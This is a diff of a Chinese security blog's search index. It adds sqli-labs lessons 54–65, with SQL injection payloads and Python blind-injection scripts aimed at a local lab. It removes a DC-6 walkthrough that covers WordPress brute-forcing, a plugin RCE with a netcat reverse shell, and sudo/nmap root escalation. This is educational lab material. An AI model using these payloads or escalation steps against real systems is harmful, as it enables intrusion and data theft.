class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 字段为secret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>方法同62</p>
-<br/>
-
-<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>方法同62</p>
-<br/>
-
-<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>方法同62</p>
+    <title>phpstudy访问localhost不出现目录的问题</title>
+    <url>/posts/2704909e/</url>
+    <content><![CDATA[<h4 id="新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’"><a href="#新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’" class="headerlink" title="新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’"></a>新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’</h4><p><img src="phpstudy1.png"></p>
 ]]></content>
       <categories>
-        <category>SQLi</category>
+        <category>phpstudy</category>
       </categories>
       <tags>
-        <tag>SQLi</tag>
+        <tag>phpstudy</tag>
       </tags>
   </entry>
   <entry>
@@ -1402,18 +1632,6 @@
       </tags>
   </entry>
   <entry>
-    <title>使用proxychains4gitclone拒绝访问</title>
-    <url>/posts/3a6e39d4/</url>
-    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>信息收集</title>
     <url>/posts/312e3d12/</url>
     <content><![CDATA[<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><h3 id="web接口查询"><a href="#web接口查询" class="headerlink" title="web接口查询:"></a>web接口查询:</h3><p><code>https://whois.aliyun.com/</code><br><code>https://www.whois365.com/cn/</code><br><code>http://whois.chinaz.com/</code><br><code>https://whois.aizhan.com/</code></p>
@@ -1541,6 +1759,112 @@
       </categories>
       <tags>
         <tag>VM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs5</title>
+    <url>/posts/fdded023/</url>
+    <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br/>
+
+<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
+<br/>
+
+<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
+<p>dbs challenges</p>
+<p>table qpu4f7zhcb</p>
+<p>columns  sessid,secret_6KIK,tryy</p>
+<br/>
+
+<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
+<br/>
+
+<p>id=0’ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  –+</p>
+<br/>
+
+<br/>
+
+<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>闭合 </p>
+<p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
+<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
+<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
+<p>secret_MCQ1</p>
+<p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
+<br/>
+
+<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>闭合 方法还是一样的</p>
+<br/>
+
+<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
+<br/>
+
+<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>使用<code>?id=1 and 1=1 union select 1,2,3</code>无回显</p>
+<p>尝试报错注入</p>
+<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
+<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
+<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
+<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
+<br/>
+
+<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>数字型 和58一样</p>
+<p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
+<br/>
+
+<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>用<code>&quot;)</code>闭合 和58一样</p>
+<br/>
+
+<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>用<code>&#39;))</code>闭合</p>
+<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
+<br/>
+
+<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>用<code>&#39;)</code>闭合 这关没回显 使用时间盲注</p>
+<p>根据前面几关可以得到</p>
+<p>数据库为 challenges</p>
+<p>table 是随机10为字符组成</p>
+<p>column是secret_ 和四位随机字符组成 </p>
+<p>本关限制重置次数为130次，可以写个python脚本试一下</p>
+<br/>
+
+<br/>
+
+<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
+<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
+<br/>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#已知表长为10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelina是正常页面下的结果</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 字段为secret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>方法同62</p>
+<br/>
+
+<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>方法同62</p>
+<br/>
+
+<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>方法同62</p>
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用proxychains4gitclone拒绝访问</title>
+    <url>/posts/3a6e39d4/</url>
+    <content><![CDATA[<p>问题:Ubuntu使用proxychain4 git clone 报错 192.168.3.11 1080 拒绝访问<br>原因: 端口被占用了，之前在虚拟机Ubuntu的代理地方设置了代理，再用使用proxychain4，把在虚拟机中的代理设置取消掉就可以了</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -2051,176 +2375,6 @@ $R=$Z('',$X);$R();
       </categories>
       <tags>
         <tag>工具手册</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DCchallenges6</title>
-    <url>/posts/e38f4498/</url>
-    <content><![CDATA[<p>TIPS</p>
-<blockquote>
-<p>CLUE<br>OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job.</p>
-<p>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-)</p>
-</blockquote>
-<br/>
-
-<p>环境</p>
-<blockquote>
-<p>网段    192.168.18.0/24</p>
-<p>kali    192.168.18.131</p>
-<p>靶机 </p>
-</blockquote>
-<br/>
-
-<p>扫描网段</p>
-<blockquote>
-<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn</strong></p>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:40 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00027s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.137<br>Host is up (0.00047s latency).<br>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00029s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds</p>
-</blockquote>
-<p>扫描靶机开放的端口</p>
-<blockquote>
-<p><strong>kali@kali2020:~$ sudo nmap 192.168.18.137 -p- -sV</strong></p>
-<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-06 19:41 CST<br>Nmap scan report for 192.168.18.137<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br><strong>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</strong></p>
-<p><strong>80/tcp open  http    Apache httpd 2.4.25 ((Debian))</strong></p>
-<p>MAC Address: 00:0C:29:74:F8:D0 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds</p>
-</blockquote>
-<p>开放了22端口和80端口</p>
-<p>dirsearch扫一下目录</p>
-<blockquote>
-<p>… ..</p>
-<p>[19:44:43] 301 -  321B  - /wp-content  -&gt;  <a href="http://192.168.18.137/wp-content/">http://192.168.18.137/wp-content/</a><br>[19:44:43] 301 -  319B  - /wp-admin  -&gt;  <a href="http://192.168.18.137/wp-admin/">http://192.168.18.137/wp-admin/</a></p>
-<p>[19:44:43] 301 -  322B  - /wp-includes  -&gt;  <a href="http://192.168.18.137/wp-includes/">http://192.168.18.137/wp-includes/</a></p>
-<p>[19:44:43] 200 -   42KB - /wp-includes/<br>[19:44:43] 500 -    0B  - /wp-content/plugins/hello.php<br>[19:44:43] 200 -    0B  - /wp-config.php    </p>
-<p>[19:44:44] 302 -    0B  - /wp-admin/  -&gt;  <a href="http://wordy/wp-login.php?redirect_to=http://192.168.18.137/wp-admin/&amp;reauth=1">http://wordy/wp-login.php?redirect_to=http%3A%2F%2F192.168.18.137%2Fwp-admin%2F&amp;reauth=1</a></p>
-<p>[19:44:44] 302 -    0B  - /wp-signup.php  -&gt;  <a href="http://wordy/wp-login.php?action=register">http://wordy/wp-login.php?action=register</a></p>
-<p>… …</p>
-</blockquote>
-<br/>
-
-<p>浏览器登录<code>192.168.18.137</code>发现会跳转到<code>http://wordy</code>，那需要修改一下host</p>
-<blockquote>
-<p>sudo vim /etc/hosts</p>
-<p>192.168.18.137 wordy</p>
-</blockquote>
-<p>进入主页可以看出这是<code>WordPress</code>,第二关也是WordPress</p>
-<p>进入后台<code>wordy/wp-login.php</code> </p>
-<p>使用wpscan扫一下</p>
-<blockquote>
-<p>kali@kali2020:~$ wpscan –url wordy -e u</p>
-<p>[i] User(s) Identified:</p>
-<p>[+] admin<br> | Found By: Rss Generator (Passive Detection)<br> | Confirmed By:<br> |  Wp Json Api (Aggressive Detection)<br> |   - <a href="http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1">http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</a><br> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> |  Login Error Messages (Aggressive Detection)</p>
-<p>[+] sarah<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-<p>[+] graham<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-<p>[+] mark<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-<p>[+] jens<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)</p>
-</blockquote>
-<p>一共扫出5个用户<code>admin,sarah,graham,mark,jens</code></p>
-<p>根据官网上的线索，需要用到kali自带的<code>rockyou.txt</code></p>
-<p>但是使用命令时说不存在，去看了下需要解压</p>
-<p><code>gzip -d /usr/share/wordlists/rockyou.txt.gz</code></p>
-<p><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</code></p>
-<blockquote>
-<p>kali@kali2020:<del>/Tools/DCchallenges/DCchallenges6$ cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_DC6.txt<br>kali@kali2020:</del>/Tools/DCchallenges/DCchallenges6$ ls<br>passwords_DC6.txt  username.txt</p>
-</blockquote>
-<p>wpscan爆破一下</p>
-<blockquote>
-<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ wpscan –url wordy -U username.txt -P passwords_DC6.txt </p>
-<p>[!] Valid Combinations Found:<br> | Username: mark, Password: helpdesk01</p>
-</blockquote>
-<p>得到<code>mark    helpdesk01</code></p>
-<p>看看这个账号能不能进入后台    ，成功进入后台</p>
-<p>进入后台一直没找到切入点，看了下网上的，从Activity monitor插件为突破口</p>
-<p>去漏洞库看看有啥漏洞可以利用</p>
-<blockquote>
-<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ searchsploit Activity monitor</p>
-<hr>
-<p> Exploit Title                       |  Path</p>
-<hr>
-<p>Activity Monitor 2002 2.6 - Remote D | windows/dos/22690.c<br>RedHat Linux 6.0/6.1/6.2 - ‘pam_cons | linux/local/19900.c<br>WordPress Plugin Plainview Activity  | php/webapps/45274.html</p>
-<hr>
-<p>Shellcodes: No Results</p>
-</blockquote>
-<br/>
-
-<blockquote>
-<p>kali@kali2020:~/Tools/DCchallenges/DCchallenges6$ sudo cp /usr/share/exploitdb/exploits/php/webapps/45274.html 45274.html</p>
-</blockquote>
-<p>可以看到这是个Activity monitor插件的RCE,执行点在<code>TOOLS</code>下的<code>IP or interger</code></p>
-<p>提前监听kali的端口<code>nc -nlvp 8888</code></p>
-<p>使用burp抓包</p>
-<p><img src="nc1.png"><br><img src="nc2.png"></p>
-<br/>
-
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p>返回/home 看到有四个用户，</p>
-<blockquote>
-<p><strong>cd mark</strong></p>
-<p><strong>cd stuff</strong></p>
-<p><strong>cat things-to-do.txt</strong></p>
-<p>cat things-to-do.txt<br>Things to do:</p>
-<ul>
-<li>Restore full functionality for the hyperdrive (need to speak to Jens)</li>
-<li>Buy present for Sarah’s farewell party</li>
-<li>Add new user: graham - GSo7isUM1D4 - done</li>
-<li>Apply for the OSCP course</li>
-<li>Buy new laptop for Sarah’s replacement</li>
-</ul>
-</blockquote>
-<p>发现一个账户 <code>graham - GSo7isUM1D4</code></p>
-<blockquote>
-<p>www-data@dc-6:/home/mark/stuff$ su graham<br>su graham<br>Password: GSo7isUM1D4</p>
-<p>graham@dc-6:/home/mark/stuff$</p>
-</blockquote>
-<p>提权</p>
-<p>也可以尝试使用ssh登录</p>
-<p><code>kali@kali2020:~$ ssh graham@192.168.18.137</code></p>
-<blockquote>
-<p>graham@dc-6:~$ sudo -l<br>Matching Defaults entries for graham on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh</p>
-</blockquote>
-<p><code>home/jens</code>下可以不需要密码执行</p>
-<blockquote>
-<p>graham@dc-6:~$ cd ../<br>graham@dc-6:/home$ ls<br>graham  jens  mark  sarah<br>graham@dc-6:/home$ </p>
-</blockquote>
-<p>向<code>bacjuos.sh</code>写入 <code>/bin/bash</code></p>
-<blockquote>
-<p>graham@dc-6:/home/jens$ echo /bin/bash &gt;&gt; backups.sh<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
-</blockquote>
-<p>成功切换到jens用户</p>
-<p><code>sudo -l</code> 获取jens权限</p>
-<blockquote>
-<p>jens@dc-6:~$ sudo -l<br>Matching Defaults entries for jens on dc-6:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
-<p>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap</p>
-</blockquote>
-<p>发现可以免密使用nmap</p>
-<p>nmap提权参考<code>https://gtfobins.github.io/gtfobins/nmap/</code></p>
-<p>nmap查看版本</p>
-<blockquote>
-<p>jens@dc-6:~$ nmap -V</p>
-<p>Nmap version 7.40 ( <a href="https://nmap.org/">https://nmap.org</a> )<br>Platform: x86_64-pc-linux-gnu<br>Compiled with: liblua-5.3.3 openssl-1.1.0c libpcre-8.39 libpcap-1.8.1 nmap-libdnet-1.12 ipv6<br>Compiled without:<br>Available nsock engines: epoll poll select</p>
-</blockquote>
-<br/>
-
-<blockquote>
-<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
-</blockquote>
-<p>执行了一下，结果靶机崩了，重置一下</p>
-<p>靶机ip改成了192.168.18.139</p>
-<p>ssh连接  <code>graham - GSo7isUM1D4</code></p>
-<p><code>kali@kali2020:~$ ssh graham@192.168.18.139</code></p>
-<blockquote>
-<p>raham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/‘ from member names<br>/home/jens/backups.sh: line 3: “/bin/bash”: No such file or directory<br>jens@dc-6:~$ </p>
-</blockquote>
-<blockquote>
-<p>TF=$(mktemp)<br>echo ‘os.execute(“/bin/sh”)’ &gt; $TF<br>sudo nmap –script=$TF</p>
-</blockquote>
-<p>成功上升为root权限,进入/root得到flag<br><img src="flag.png"></p>
-]]></content>
-      <categories>
-        <category>DCchallenges</category>
-      </categories>
-      <tags>
-        <tag>DCchallenges</tag>
       </tags>
   </entry>
 </search>
